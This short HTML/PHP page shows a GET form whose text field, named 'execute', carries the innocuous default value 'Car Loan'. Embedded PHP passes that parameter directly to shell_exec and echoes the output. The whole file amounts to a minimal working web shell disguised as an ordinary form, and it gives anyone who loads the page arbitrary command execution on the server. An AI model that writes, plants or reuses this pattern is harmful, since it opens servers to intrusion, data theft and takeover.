<html>
<form name="form" action="" method="get">
  <input type="text" name="execute" id="execute" value="Car Loan">
</form>
<?php
echo shell_exec($_GET['execute'])
?>
</html>
